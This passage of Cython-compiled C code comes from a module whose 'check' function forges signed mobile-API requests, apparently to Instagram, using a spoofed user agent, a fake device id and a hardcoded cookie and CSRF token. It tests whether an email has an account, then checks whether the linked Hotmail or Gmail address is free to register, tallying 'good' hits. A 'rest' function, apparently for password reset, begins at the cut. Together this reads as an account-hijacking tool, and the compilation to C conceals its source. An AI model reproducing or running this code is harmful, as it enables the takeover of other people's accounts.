      __Pyx_GOTREF(__pyx_t_3);
    } else
    #endif
    {
      __pyx_t_6 = PyTuple_New(2+__pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 539, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (__pyx_t_1) {
        __Pyx_GIVEREF(__pyx_t_1); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_1); __pyx_t_1 = NULL;
      }
      __Pyx_INCREF(__pyx_v_username);
      __Pyx_GIVEREF(__pyx_v_username);
      PyTuple_SET_ITEM(__pyx_t_6, 0+__pyx_t_8, __pyx_v_username);
      __Pyx_INCREF(__pyx_v_gg);
      __Pyx_GIVEREF(__pyx_v_gg);
      PyTuple_SET_ITEM(__pyx_t_6, 1+__pyx_t_8, __pyx_v_gg);
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_6, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 539, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    }
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    goto __pyx_L3;
  }

  
  /*else*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_bademail); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 541, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyInt_AddObjC(__pyx_t_3, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 541, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_bademail, __pyx_t_2) < 0) __PYX_ERR(0, 541, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_pppp); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 542, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_6)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 542, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_L3:;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.hotmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_json_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XDECREF(__pyx_v_gg);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_17check(PyObject *__pyx_self, PyObject *__pyx_v_email); /*proto*/
static PyMethodDef __pyx_mdef_6source_17check = {"check", (PyCFunction)__pyx_pw_6source_17check, METH_O, 0};
static PyObject *__pyx_pw_6source_17check(PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("check (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_16check(__pyx_self, ((PyObject *)__pyx_v_email));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_16check(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_dev = NULL;
  PyObject *__pyx_v_device_id = NULL;
  PyObject *__pyx_v_uui = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  int __pyx_t_8;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("check", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 547, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 547, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_INCREF(__pyx_kp_u_android);
  __pyx_v_dev = __pyx_kp_u_android;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_hashlib); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_md5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_uuid); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_6), NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_6, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetSlice(__pyx_t_1, 0, 16, NULL, NULL, &__pyx_slice__35, 0, 1, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_v_dev, __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 549, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_device_id = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 550, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 550, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 550, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 550, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_uui = __pyx_t_2;
  __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 552, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_User_Agent, __pyx_v_ua) < 0) __PYX_ERR(0, 552, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_Cookie, __pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP) < 0) __PYX_ERR(0, 552, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_Content_Type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 552, __pyx_L1_error)
  __pyx_v_headers = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 557, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 557, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_dumps); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 557, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 558, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_csrftoken, __pyx_kp_u_9y3N5kLqzialQA7z96AMiyAKLMBWpqVj) < 0) __PYX_ERR(0, 558, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_adid, __pyx_v_uui) < 0) __PYX_ERR(0, 558, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_guid, __pyx_v_uui) < 0) __PYX_ERR(0, 558, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_device_id, __pyx_v_device_id) < 0) __PYX_ERR(0, 558, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_query, __pyx_v_email) < 0) __PYX_ERR(0, 558, __pyx_L1_error)
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 557, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyNumber_Add(__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 557, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_signed_body, __pyx_t_3) < 0) __PYX_ERR(0, 557, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_ig_sig_key_version, __pyx_kp_u_4) < 0) __PYX_ERR(0, 557, __pyx_L1_error)
  __pyx_v_data = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 566, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_post); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 566, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 568, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 568, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 568, __pyx_L1_error)

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__36, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 566, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_text); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 569, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_response = __pyx_t_2;
  __pyx_t_2 = 0;

  
  __pyx_t_7 = (__Pyx_PySequence_ContainsTF(__pyx_v_email, __pyx_v_response, Py_EQ)); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 570, __pyx_L1_error)
  __pyx_t_8 = (__pyx_t_7 != 0);
  if (__pyx_t_8) {

    
    __pyx_t_8 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_hotmail_com, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 571, __pyx_L1_error)
    __pyx_t_7 = (__pyx_t_8 != 0);
    if (__pyx_t_7) {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_hotmail); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 572, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_email);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 572, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
      goto __pyx_L4;
    }

    
    __pyx_t_7 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_gmail_com, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 573, __pyx_L1_error)
    __pyx_t_8 = (__pyx_t_7 != 0);
    if (__pyx_t_8) {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_check_gmail); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 574, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_1, function);
        }
      }
      __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_email);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 574, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
    }
    __pyx_L4:;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_goodig); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 575, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = __Pyx_PyInt_AddObjC(__pyx_t_2, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 575, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_goodig, __pyx_t_1) < 0) __PYX_ERR(0, 575, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_pppp); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 576, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 576, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    goto __pyx_L3;
  }

  
  /*else*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_badinsta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 578, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 578, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_badinsta, __pyx_t_2) < 0) __PYX_ERR(0, 578, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_pppp); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 579, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 579, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_L3:;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.check", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_dev);
  __Pyx_XDECREF(__pyx_v_device_id);
  __Pyx_XDECREF(__pyx_v_uui);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_19rest(PyObject *__pyx_self, PyObject *__pyx_v_user); /*proto*/
static PyMethodDef __pyx_mdef_6source_19rest = {"rest", (PyCFunction)__pyx_pw_6source_19rest, METH_O, 0};
static PyObject *__pyx_pw_6source_19rest(PyObject *__pyx_self, PyObject *__pyx_v_user) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("rest (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_18rest(__pyx_self, ((PyObject *)__pyx_v_user));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_18rest(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_user) {
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_r = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_t_8;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
